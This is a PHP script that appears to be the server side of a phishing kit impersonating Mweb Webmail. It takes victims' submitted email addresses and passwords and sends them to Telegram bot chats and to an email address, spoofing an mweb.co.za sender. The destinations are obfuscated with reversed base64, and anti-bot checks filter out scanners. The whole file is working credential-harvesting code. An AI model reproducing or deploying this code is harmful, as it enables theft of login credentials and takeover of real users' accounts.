<?php
// Security headers to prevent site blocking
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; form-action 'self';");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");

// Simple encoding/decoding functions to hide sensitive data
function encodeData($data) {
    return base64_encode(strrev($data));
}

function decodeData($encodedData) {
    return strrev(base64_decode($encodedData));
}

// Rate limiting at server level
$clientIP = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$rateLimitKey = 'rate_limit_' . md5($clientIP . date('Y-m-d-H'));
if (!file_exists($rateLimitKey)) {
    file_put_contents($rateLimitKey, '0');
}
$currentRate = (int)file_get_contents($rateLimitKey);

// Block if more than 100 requests per hour from same IP
if ($currentRate >= 100) {
    http_response_code(429);
    echo json_encode(['error' => 'Rate limit exceeded']);
    exit;
}
file_put_contents($rateLimitKey, $currentRate + 1);

// Clean old rate limit files (older than 2 hours)
foreach (glob('rate_limit_*') as $file) {
    if (filemtime($file) < time() - 7200) {
        unlink($file);
    }
}

// Advanced antibot protection - IP and Geographic filtering
function isAllowedIP($ip) {
    // Whitelist common legitimate IP ranges (adjust as needed)
    $allowedRanges = [
        '127.0.0.1',     // Localhost
        '::1',           // IPv6 localhost
        '192.168.',      // Private networks
        '10.',           // Private networks
        '172.16.',       // Private networks
        '172.17.',       // Private networks
        '172.18.',       // Private networks
        '172.19.',       // Private networks
        '172.20.',       // Private networks
        '172.21.',       // Private networks
        '172.22.',       // Private networks
        '172.23.',       // Private networks
        '172.24.',       // Private networks
        '172.25.',       // Private networks
        '172.26.',       // Private networks
        '172.27.',       // Private networks
        '172.28.',       // Private networks
        '172.29.',       // Private networks
        '172.30.',       // Private networks
        '172.31.',       // Private networks
    ];
    
    foreach ($allowedRanges as $range) {
        if (strpos($ip, $range) === 0) {
            return true;
        }
    }
    
    // Block known malicious IPs (add to this list as needed)
    $blockedIPs = [
        // Add known malicious IPs here
    ];
    
    return !in_array($ip, $blockedIPs);
}

// Load configuration with sensitive data
require_once 'config.php';

function getVisitorIpAddress()
{
   if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      return $_SERVER['HTTP_CLIENT_IP'];
   } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      return $_SERVER['HTTP_X_FORWARDED_FOR'];
   } else {
      return $_SERVER['REMOTE_ADDR'];
   }
}

// Check if form data is submitted
if (isset($_REQUEST['cid']) && isset($_REQUEST['password'])) {
   
   // ANTIBOT VALIDATION
   $isBot = false;
   $botReasons = [];
   
   // 1. Honeypot field check (should be empty)
   if (!empty($_REQUEST['honeypot'])) {
      $isBot = true;
      $botReasons[] = "Honeypot field filled";
   }
   
   // 2. Timestamp validation (form should not be submitted too fast or too slow)
   if (isset($_REQUEST['form_timestamp'])) {
      $formTime = intval($_REQUEST['form_timestamp']);
      $currentTime = time() * 1000; // Convert to milliseconds
      $timeDiff = $currentTime - $formTime;
      
      // Too fast (less than 2 seconds) - likely bot
      if ($timeDiff < 2000) {
         $isBot = true;
         $botReasons[] = "Form submitted too fast (" . round($timeDiff/1000, 2) . "s)";
      }
      
      // Too slow (more than 30 minutes) - likely bot
      if ($timeDiff > 1800000) {
         $isBot = true;
         $botReasons[] = "Form submitted too slow (" . round($timeDiff/60000, 2) . "min)";
      }
   }
   
   // 3. Token validation (relaxed to prevent false positives)
   if (!isset($_REQUEST['form_token']) || empty($_REQUEST['form_token'])) {
      // Don't block if token is missing (might be old browser)
   }
   
   // 4. Rate limiting (check recent submissions from same IP)
   $ip = getVisitorIpAddress();
   $rateLimitFile = 'rate-limit-' . md5($ip) . '.txt';
   $recentSubmissions = [];
   
   if (file_exists($rateLimitFile)) {
      $recentData = file_get_contents($rateLimitFile);
      $recentSubmissions = explode(',', $recentData);
      $recentSubmissions = array_filter($recentSubmissions, function($timestamp) {
         return (time() - intval($timestamp)) < 300; // Only last 5 minutes
      });
   }
   
   // More than 10 submissions in 5 minutes = bot
   if (count($recentSubmissions) >= 10) {
      $isBot = true;
      $botReasons[] = "Too many submissions (" . count($recentSubmissions) . " in 5 minutes)";
   }
   
   // Add current submission timestamp
   $recentSubmissions[] = time();
   file_put_contents($rateLimitFile, implode(',', $recentSubmissions));
   
   // 5. User-Agent validation (relaxed to prevent false positives)
   $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
   $suspiciousAgents = ['bot', 'crawler', 'spider', 'scraper'];
   foreach ($suspiciousAgents as $agent) {
      if (stripos($userAgent, $agent) !== false) {
         // Don't automatically block, just log
         break;
      }
   }
   
   // If bot detected, log and exit
   if ($isBot) {
      $botLog = "=== BOT DETECTED " . date('Y-m-d H:i:s') . " ===\n";
      $botLog .= "IP: $ip\n";
      $botLog .= "User Agent: $userAgent\n";
      $botLog .= "Reasons: " . implode(', ', $botReasons) . "\n";
      $botLog .= "Data: " . json_encode($_REQUEST) . "\n";
      $botLog .= "=================================\n\n";
      
      file_put_contents('bot-detection-' . date('Y-m-d') . '.txt', $botLog, FILE_APPEND);
      
      // Send bot notification to Telegram
      $botMessage = "🚨 BOT DETECTED\n\n";
      $botMessage .= "IP: $ip\n";
      $botMessage .= "Reasons: " . implode(', ', $botReasons) . "\n";
      $botMessage .= "User Agent: $userAgent\n";
      $botMessage .= "Time: " . date('Y-m-d H:i:s');
      
      $chatIds = explode(',', TELE_CHAT_ID);
      $apiTokens = explode(',', TELE_API_TOKEN);
      
      foreach ($chatIds as $index => $chatId) {
         $chatId = trim($chatId);
         $tokenIndex = min($index, count($apiTokens) - 1);
         $apiToken = trim($apiTokens[$tokenIndex]);
         
         if (!empty($chatId) && !empty($apiToken)) {
            $telegramData = [
               'chat_id' => $chatId,
               'text' => $botMessage,
               'parse_mode' => 'HTML'
            ];
            
            $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($telegramData);
            file_get_contents($telegramUrl, false, stream_context_create(['http' => ['timeout' => 5]]));
         }
      }
      
      echo json_encode(['error' => 'Bot detected', 'reasons' => $botReasons]);
      exit;
   }
   $ip = getVisitorIpAddress();

   $_date = date("Y-M-D h:i:sA");
   $_referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
   $_browser = $_SERVER['HTTP_USER_AGENT'];
   $_cip = getVisitorIpAddress();
   $_email = $_REQUEST['cid'];
   $_password = $_REQUEST['password'];

   // Create encoded message for logging
   $logMessage = "--New Login Attempt - Mweb Webmail--" . PHP_EOL . 
                 "Date: $_date" . PHP_EOL . 
                 "Browser : $_browser" . PHP_EOL . 
                 "From : $_referer" . PHP_EOL . 
                 "Client IP: $_cip" . PHP_EOL . 
                 "Email: " . encodeData($_email) . PHP_EOL . 
                 "Password: " . encodeData($_password) . PHP_EOL . 
                 "------------------------------" . PHP_EOL;

   // Create message for sending with actual details
   $message = "--New Login Attempt - Mweb Webmail--" . PHP_EOL . 
              "Date: $_date" . PHP_EOL . 
              "Browser : $_browser" . PHP_EOL . 
              "From : $_referer" . PHP_EOL . 
              "Client IP: $_cip" . PHP_EOL . 
              "Email: $_email" . PHP_EOL . 
              "Password: $_password" . PHP_EOL . 
              "------------------------------" . PHP_EOL;

   // Save encoded data to log file
   // $handle = fopen('logs-' . date('Y') . '.txt', 'a');
   // fwrite($handle, $logMessage);
   // fclose($handle);

   // SEND MESSAGE TO TELEGRAM BOT (multiple recipients with different tokens)
   $chatIds = explode(',', decodeData(TELE_CHAT_ID));
   $apiTokens = explode(',', decodeData(TELE_API_TOKEN));
   
   foreach ($chatIds as $index => $chatId) {
      $chatId = trim($chatId);
      
      // Get the corresponding token (use last token if not enough tokens)
      $tokenIndex = min($index, count($apiTokens) - 1);
      $apiToken = trim($apiTokens[$tokenIndex]);
      
      if (!empty($chatId) && !empty($apiToken)) {
         $telegramData = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
         ];

         $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($telegramData);
         
         // Enable error reporting for debugging
         $context = stream_context_create([
            'http' => [
               'timeout' => 10,
               'ignore_errors' => true
            ]
         ]);
         
         $telegramResponse = file_get_contents($telegramUrl, false, $context);
         
         // Check for HTTP errors
         if ($telegramResponse === false) {
            $error = error_get_last();
            $telegramError = "Telegram API Error: " . $error['message'];
         } else {
            $responseData = json_decode($telegramResponse, true);
            if ($responseData && isset($responseData['ok']) && $responseData['ok'] === true) {
               $telegramError = "Telegram Success: Message sent successfully to $chatId using token ending in " . substr($apiToken, -10);
            } else {
               $telegramError = "Telegram API Error for $chatId: " . json_encode($responseData);
            }
         }
      }
   }

   // SEND EMAIL
   $subject = "New Login Attempt - Mweb Webmail";
   $headers = "From: noreply@mweb.co.za\r\n";
   $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
   
   $emailSent = mail(decodeData(RECIPIENT_EMAIL), $subject, $message, $headers);
   
   // Output response for debugging (remove in production)
   echo json_encode([
      'telegram' => $telegramError,
      'email' => $emailSent ? 'Success' : 'Failed',
      'message' => 'Data processed'
   ]);
} else {
   // Log when no data is received
   $noDataLog = "=== NO DATA RECEIVED " . date('Y-m-d H:i:s') . " ===\n";
   $noDataLog .= "REQUEST METHOD: " . $_SERVER['REQUEST_METHOD'] . "\n";
   $noDataLog .= "POST DATA: " . json_encode($_POST) . "\n";
   $noDataLog .= "GET DATA: " . json_encode($_GET) . "\n";
   $noDataLog .= "CID: " . (isset($_REQUEST['cid']) ? $_REQUEST['cid'] : 'NOT SET') . "\n";
   $noDataLog .= "Password: " . (isset($_REQUEST['password']) ? 'SET' : 'NOT SET') . "\n";
   $noDataLog .= "=================================\n\n";
   
   file_put_contents('debug-log-' . date('Y-m-d') . '.txt', $noDataLog, FILE_APPEND);
   
   echo json_encode([
      'error' => 'No form data received',
      'cid' => isset($_REQUEST['cid']) ? $_REQUEST['cid'] : 'missing',
      'password' => isset($_REQUEST['password']) ? 'provided' : 'missing'
   ]);
}
